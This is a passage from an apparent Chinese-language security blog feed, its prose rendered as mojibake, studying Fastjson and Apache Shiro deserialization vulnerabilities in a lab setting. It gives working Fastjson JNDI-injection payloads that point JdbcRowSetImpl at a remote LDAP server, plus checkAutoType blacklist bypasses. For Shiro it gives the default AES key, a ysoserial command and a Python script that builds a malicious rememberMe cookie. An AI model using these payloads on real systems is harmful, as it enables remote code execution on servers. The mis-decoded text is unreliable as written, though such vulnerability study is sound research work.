å…¥çš„åœ°å€å»è®¿é—®è¿œç¨‹æœåŠ¡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091639344.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091641791.png" alt="null"></p><h3 id="æ€»ç»“åˆ†æé“¾ï¼š"><a href="#æ€»ç»“åˆ†æé“¾ï¼š" class="headerlink" title="æ€»ç»“åˆ†æé“¾ï¼š"></a>æ€»ç»“åˆ†æé“¾ï¼š</h3><p>parseObject -&gt;  parse -&gt; key(@type) -&gt; TypeUtils.loadClass -&gt; ObjectDeserializer -&gt; JdbcRowSetImpl -&gt; connect -&gt; lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091652348.png" alt="null"></p><p>ç»“åˆ <strong>ä¼ å…¥å…¶ä»–ç±»ï¼Œè§£æåé»˜è®¤æ‰§è¡Œ set getç±»æ–¹æ³•</strong> çš„ç»“è®ºï¼Œå½“èµ°åˆ° <code>JdbcRowSetImpl.class</code> ä¸­è§¦å‘äº†å…¶ä¸­çš„setã€getæ–¹æ³•ï¼Œè€Œ <code>setAutoCommit</code> ä¸­æ°å¥½æœ‰ <code>connect</code> æ–¹æ³•ï¼Œè§¦å‘æ‰§è¡Œäº† <code>lookup</code> æ–¹æ³•ï¼Œè€Œ <code>lookup</code> æ–¹æ³•ä¸­ è§¦å‘äº† <code>getDataSourceName</code> ï¼Œæ‰€ä»¥ poc æ„é€ çš„æ€è·¯å°±æœ‰äº†ï¼š</p><ol><li><p><code>@type</code> : å‘Šè¯‰ Fastjson å°†å®ƒååºåˆ—åŒ–æˆæŒ‡å®šçš„ Java ç±»ï¼Œå³ â€œcom.sun.rowset.JdbcRowSetImplâ€</p></li><li><p><code>dataSourceName</code> : JDBC è¿æ¥çš„æ•°æ®æºï¼Œæ­¤å¤„ä½¿ç”¨ <code>Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p></li><li><p><code>autoCommit</code> : è°ƒç”¨ <code>setAutoCommit(true)</code> ï¼Œè§¦å‘é€»è¾‘</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/rfkucd\&quot;, \&quot;autoCommit\&quot;:true&#125;<br>--&gt;<br>&#123;<br>  &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>  &quot;dataSourceName&quot;: &quot;ldap://169.254.39.1:1389/rfkucd&quot;,<br>  &quot;autoCommit&quot;: true<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è¾¾åˆ° <code>lookup</code> è®¿é—®è¿œç¨‹æœåŠ¡çš„ç›®çš„ï¼Œé€ æˆäº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091653730.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091655152.png" alt="null"></p><p>å½“ç„¶ï¼Œ1.2.24 çš„æ¼æ´åœ¨ä¹‹åçš„ç‰ˆæœ¬å·²ç»è¢«ä¿®å¤ï¼Œé»˜è®¤ä¸å¼€å¯ autoType</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508100949058.png" alt="null"></p><h2 id="FastJson-1-2-25-1-2-47-CCé“¾åˆ†æ"><a href="#FastJson-1-2-25-1-2-47-CCé“¾åˆ†æ" class="headerlink" title="FastJson 1.2.25-1.2.47 CCé“¾åˆ†æ"></a>FastJson 1.2.25-1.2.47 CCé“¾åˆ†æ</h2><h3 id="1ã€å¼€å¯-autoType"><a href="#1ã€å¼€å¯-autoType" class="headerlink" title="1ã€å¼€å¯ autoType"></a>1ã€å¼€å¯ autoType</h3><h4 id="æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š"></a>æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</h4><ol><li><p>å¼€å¯ <code>AutoTypeSupport</code></p></li><li><p>åŠ  <code>L</code> å’Œ <code>;</code></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);<br>String testPoc = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/5uppp0\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot;&#125;&quot;;<br>JSONObject test = JSON.parseObject(testPoc);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101014904.png" alt="null"></p><h4 id="POC-åˆ†æ-é“¾åˆ†æï¼š"><a href="#POC-åˆ†æ-é“¾åˆ†æï¼š" class="headerlink" title="POC åˆ†æ&amp;é“¾åˆ†æï¼š"></a>POC åˆ†æ&amp;é“¾åˆ†æï¼š</h4><p><code>JSONObject test = JSON.parseObject(testPoc);</code> æ–­ç‚¹è°ƒè¯•</p><p>åˆ¤æ–­ key &#x3D;&#x3D; @type</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101025365.png" alt="null"></p><p>æ­¥å…¥ <code>checkAutoType</code>ï¼Œ<code>acceptList</code>ç™½åå•ï¼Œè¿™é‡Œçš„ <code>checkAutoType</code> ä¸­<code>acceptList</code> ä¸ºç©ºæ•°ç»„ï¼Œä¸ä¼šåŒ¹é…ç™½åå•ï¼Œè€Œæ˜¯è¿›å…¥ä¸‹æ–¹çš„é»‘åå•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101029937.png" alt="null"></p><p>å¯ä»¥çœ‹åˆ°å…ˆè¿›å…¥é»‘åå•è¿›è¡Œåˆ¤æ–­ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101033816.png" alt="null"></p><p>é»‘åå•ä¾æ¬¡è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101040522.png" alt="null"></p><p>ç»§ç»­æ‰§è¡Œã€‚è¿™ä¸€æ­¥çœ‹åˆ°åˆ¤æ–­äº† <code>className</code> çš„å¼€å¤´å’Œç»“å°¾å¦‚æœåˆ†åˆ«ä¸º<code>L</code>å’Œ<code>;</code>ï¼Œåˆ™è¿›å…¥<code>substring</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101044398.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047885.png" alt="null"></p><p>åœ¨æ‰§è¡Œäº† <code>substring</code> ä¹‹åï¼ŒåŸæœ¬çš„<code>className = Lcom.sun.rowset.JdbcRowSetImpl;</code> è¢«æ›¿æ¢æˆäº† <code>newClassName = com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047540.png" alt="null"></p><p>ä¹‹ååŒ 1.2.24 çš„ååºåˆ—åŒ–é“¾</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101054144.png" alt="null"></p><p><strong>æ¥ä¸‹æ¥åˆ†æä¸å¼€å¯</strong> <code>AutoTypeSupport</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101056293.png" alt="null"></p><p>æ¥åˆ°ç™½åå•ï¼Œ<code>autoTypeSupport</code> åˆ¤æ–­ä¸º <code>false</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101057185.png" alt="null"></p><p>åœ¨è¿™ä¸€æ­¥è¿›è¡Œé»‘åå•å¾ªç¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101100575.png" alt="null"></p><p>åˆ¤æ–­ä¸ºå¼‚å¸¸ï¼ŒæŠ¥é”™ï¼Œç»“æŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101102069.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103424.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103380.png" alt="null"></p><h4 id="æ€»ç»“åˆ†æé“¾ï¼š-1"><a href="#æ€»ç»“åˆ†æé“¾ï¼š-1" class="headerlink" title="æ€»ç»“åˆ†æé“¾ï¼š"></a>æ€»ç»“åˆ†æé“¾ï¼š</h4><p>parseObject -&gt;  key(@type) -&gt; checkAutoType -&gt; denyList -&gt; substring -&gt; loadClass -&gt; newClassName &#x3D; com.sun.rowset.JdbcRowSetImpl</p><p>è¿™äº›ç‰ˆæœ¬éƒ½æ˜¯ç»“åˆé»‘åå•è¿›è¡Œæ„é€ ç»•è¿‡ï¼Œæ¯”å¦‚ åŠ  <code>L</code> å’Œ <code>;</code>ã€åŠ  <code>LL</code> å’Œ <code>;;</code>ã€åŠ  <code>[</code> ç­‰ç­‰ï¼Œå…³é”®ç‚¹è¦å¼€å¯ <code>AutoTypeSupport</code></p><blockquote><p>ä»1.2.41è¯´èµ·ã€‚åœ¨checkAutotype()å‡½æ•°ä¸­ï¼Œä¼šå…ˆæ£€æŸ¥ä¼ å…¥çš„@typeçš„å€¼æ˜¯å¦æ˜¯åœ¨é»‘åå•é‡Œï¼Œå¦‚æœè¦ååºåˆ—åŒ–çš„ç±»ä¸åœ¨é»‘åå•ä¸­ï¼Œé‚£</p><p>ä¹ˆæ‰ä¼šå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ã€‚é—®é¢˜æ¥äº†ï¼Œåœ¨ååºåˆ—åŒ–å‰ï¼Œä¼šç»è¿‡loadClass()å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œå…¶ä¸­ä¸€ä¸ªå¤„ç†æ–¹æ³•æ˜¯ï¼šåœ¨åŠ è½½ç±»çš„æ—¶å€™ä¼šå»</p><p>æ‰classNameå‰åçš„Lå’Œ;ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥Lcom.sun.rowset.JdbcRowSetImpl;ï¼Œåœ¨ç»è¿‡é»‘ç™½åå•åï¼Œåœ¨åŠ è½½ç±»æ—¶ä¼šå»æ‰å‰åçš„</p><p>Lå’Œ;ï¼Œå°±å˜æˆäº†com.sun.rowset.JdbcRowSetImplï¼Œååºåˆ—åŒ–äº†æ¶æ„ç±»ã€‚</p><p>æ›´æ–°äº†1.2.42ï¼Œæ–¹æ³•æ˜¯å…ˆåˆ¤æ–­ååºåˆ—åŒ–ç›®æ ‡ç±»çš„ç±»åå‰åæ˜¯ä¸æ˜¯<code>L</code>å’Œ<code>;</code>ï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå…ˆå»æ‰Lå’Œ;ï¼Œå†è¿›è¡Œé»‘ç™½åå•æ ¡éªŒï¼ˆå·æ‡’</p><p>qaqï¼‰ã€‚å…³äº1.2.42ç»•è¿‡éå¸¸ç®€å•ï¼Œåªéœ€è¦åŒå†™Lå’Œ;ï¼Œå°±å¯ä»¥åœ¨ç¬¬ä¸€æ­¥å»æ‰Lå’Œ;åï¼Œä¸1.2.41ç›¸åŒã€‚</p><p>æ›´æ–°ä¹Ÿéå¸¸éšæ„ï¼Œåœ¨1.2.43ä¸­ï¼Œé»‘ç™½åå•åˆ¤æ–­å‰ï¼Œåˆå¢åŠ äº†ä¸€ä¸ªæ˜¯å¦ä»¥LLå¼€å¤´çš„åˆ¤æ–­ï¼Œå¦‚æœä»¥LLå¼€å¤´ï¼Œé‚£ä¹ˆå°±ç›´æ¥æŠ›å¼‚å¸¸ï¼Œéå¸¸éšæ„</p><p>è§£å†³äº†åŒå†™çš„é—®é¢˜ã€‚ä½†æ˜¯é™¤äº†Lå’Œ;ï¼ŒFastJsonåœ¨åŠ è½½ç±»çš„æ—¶å€™ï¼Œä¸åªå¯¹Lå’Œ;è¿™æ ·çš„ç±»è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œ[ä¹Ÿå¯¹ç‰¹æ®Šå¤„ç†äº†ï¼Œæ‰€ä»¥ï¼ŒåŒæ ·çš„</p><p>æ–¹å¼åœ¨å‰é¢æ·»åŠ [ç»•è¿‡äº†1.2.43åŠä¹‹å‰çš„è¡¥ä¸ã€‚</p><p>åœ¨1.2.44ä¸­ï¼Œé»‘å®¢ä»¬çƒ¦ä¸çƒ¦ï¼Œæ¥äº†ä¸ªç‹ çš„ï¼šåªè¦ä½ ä»¥<code>[</code>å¼€å¤´æˆ–è€…<code>;</code>ç»“å°¾ï¼Œæˆ‘ç›´æ¥æŠ›ä¸€ä¸ªå¼‚å¸¸ã€‚å¦‚æ­¤ï¼Œç»ˆäºè§£å†³äº†ç¼ ç»µå¤šä¸ªç‰ˆæœ¬çš„æ¼æ´ã€‚</p></blockquote><h3 id="2ã€checkAutotypeç»•è¿‡"><a href="#2ã€checkAutotypeç»•è¿‡" class="headerlink" title="2ã€checkAutotypeç»•è¿‡"></a>2ã€checkAutotypeç»•è¿‡</h3><p>FastJsonæœ‰ä¸€ä¸ªå…¨å±€ç¼“å­˜æœºåˆ¶ï¼šåœ¨è§£æjsonæ•°æ®å‰ä¼šå…ˆåŠ è½½ç›¸å…³é…ç½®ï¼Œè°ƒç”¨ addBaseClassMappings() å’Œ loadClass() å‡½æ•°å°†ä¸€äº›åŸºç¡€ç±»å’Œç¬¬ä¸‰æ–¹åº“å­˜æ”¾åˆ° mappings ä¸­ï¼ˆmappings æ˜¯ ConcurrentMap ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸€æ¬¡è¿æ¥ä¸­ä¼ å…¥ä¸¤ä¸ªé”®å€¼ a å’Œ b ï¼Œä¹‹ååœ¨è§£ææ—¶ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ autotypeï¼Œä¼šä» mappings æˆ– deserializers.findClass() å‡½æ•°ä¸­è·å–ååºåˆ—åŒ–çš„å¯¹åº”ç±»ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ç›´æ¥è¿”å›ç»•è¿‡äº†é»‘åå•ã€‚åˆ©ç”¨çš„æ˜¯ java.lang.Class ç±»ï¼Œå…¶ååºåˆ—åŒ–å¤„ç†ç±» MiscCodec ç±»å¯ä»¥å°†ä»»æ„ç±»åŠ è½½åˆ° mappings ä¸­ï¼Œå®ç°äº†ç›®æ ‡ã€‚</p><p>ç¬¬ä¸€æ­¥åˆ©ç”¨ java.lang.Class å°†æ¶æ„ç±»åŠ è½½åˆ° mappings ä¸­ï¼›</p><p>ç¬¬äºŒæ­¥ä»åœ¨ checkAutoType å†…éƒ¨ï¼Œæ²¡æœ‰å¼€å¯ autotype ï¼Œç›´æ¥ä» mappings ä¸­è·å– mappings ä¸­å–å‡ºæ¶æ„ç±»å¹¶ç»•è¿‡é»‘åå•è¿›è¡Œäº†ååºåˆ—åŒ–ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101120042.png" alt="null"></p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">testStr=&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://169.254.39.1:1389/is9aig&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiroååºåˆ—åŒ–</title>
    <link href="/2025/10/21/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/21/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiroååºåˆ—åŒ–"><a href="#Shiroååºåˆ—åŒ–" class="headerlink" title="Shiroååºåˆ—åŒ–"></a>Shiroååºåˆ—åŒ–</h1><h2 id="Shiroååºåˆ—åŒ–-1"><a href="#Shiroååºåˆ—åŒ–-1" class="headerlink" title="Shiroååºåˆ—åŒ–"></a>Shiroååºåˆ—åŒ–</h2><h3 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h3><p><a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiroååºåˆ—åŒ–æ¼æ´ç¬”è®°ä¸€ï¼ˆåŸç†ç¯‡ï¼‰</a></p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ç›´æ¥ä»githubä¸Šcloneä»£ç åˆ°æœ¬åœ°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">git clone https://github.com/apache/shiro.git<br>cd shiro<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ pml.xmlï¼ˆè·¯å¾„ä¸º \shiro\samples\web\pom.xmlï¼‰</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-comment">&lt;!-- æ·»åŠ  --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹‹å maven æ­å»ºï¼Œé…ç½® tomcat ç¯å¢ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505867.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505841.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505868.png" alt="img"></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ¼æ´åˆ†æå…·ä½“å·²ç»åœ¨ Java-sec-code åˆ†æè¿‡äº†ï¼Œå°±ä¸å†é‡å¤äº†ï¼š</p><p><strong>é€»è¾‘æ€»ç»“ï¼š</strong></p><p>å½“è·å–ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œå¤§è‡´çš„å…³é”®å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>è·å–Cookieä¸­rememberMeçš„å€¼</p></li><li><p>å¯¹rememberMeè¿›è¡ŒBase64è§£ç </p></li><li><p>ä½¿ç”¨AESè¿›è¡Œè§£å¯†</p></li><li><p>å¯¹è§£å¯†çš„å€¼è¿›è¡Œååºåˆ—åŒ–</p></li></ol><p>ç”±äºAESåŠ å¯†çš„Keyæ˜¯ç¡¬ç¼–ç çš„é»˜è®¤Keyï¼Œå› æ­¤æ”»å‡»è€…å¯é€šè¿‡ä½¿ç”¨é»˜è®¤çš„Keyå¯¹æ¶æ„æ„é€ çš„åºåˆ—åŒ–æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå½“</p><p>CookieRememberMeManager å¯¹æ¶æ„çš„ rememberMe è¿›è¡Œä»¥ä¸Šè¿‡ç¨‹å¤„ç†æ—¶ï¼Œæœ€ç»ˆä¼šå¯¹æ¶æ„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> åŠŸèƒ½ç”¨äºâ€œè®°ä½ç™»å½•çŠ¶æ€â€ã€‚å®ƒçš„è®¾è®¡é€»è¾‘æ˜¯ï¼š</p><p>ç”¨æˆ·å‹¾é€‰â€œè®°ä½æˆ‘â€ç™»å½•åï¼ŒShiro æŠŠç”¨æˆ·çš„è®¤è¯ä¿¡æ¯<strong>åºåˆ—åŒ–ä¸ºå­—èŠ‚æµ</strong>ï¼Œç”¨ä¸€ä¸ªå›ºå®šå¯†é’¥ï¼ˆé»˜è®¤æ˜¯ <code>kPH+bIxk5D2deZiIxcaaaA==</code>ï¼‰ç”¨ AES åŠ å¯†ï¼ŒBase64 ç¼–ç åä½œä¸º <code>rememberMe</code> Cookie å‘é€ç»™æµè§ˆå™¨ã€‚å½“æµè§ˆå™¨ä¸‹æ¬¡è¯·æ±‚æ—¶ï¼ŒShiroï¼šè¯»å– <code>rememberMe</code> Cookieï¼Œç”¨åŒæ ·çš„å¯†é’¥è¿›è¡Œè§£å¯†ï¼Œç„¶å<strong>ç›´æ¥ååºåˆ—åŒ–</strong>å‡ºç”¨æˆ·å¯¹è±¡ï¼Œåªè¦æ”»å‡»è€…èƒ½æ§åˆ¶ <code>rememberMe</code> Cookie å†…å®¹ï¼Œ<strong>å°±èƒ½æ„é€ æ¶æ„å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</strong></p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">java -jar ysoserial.jar CommonsBeanutils1 &quot;calc.exe&quot; &gt; payload.bin<br></code></pre></td></tr></table></figure><p>åŠ å¯† Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro é»˜è®¤å¯†é’¥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># è¯»å– payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># è¡¥é½ä¸º 16 çš„å€æ•° (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC åŠ å¯† (IV éšæœºç”Ÿæˆ)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># å®é™…æ”»å‡»éœ€éšæœº IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 ç¼–ç </span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro æ ¼å¼: IV+å¯†æ–‡</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ¶æ„ Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">æ¶æ„ Cookie: 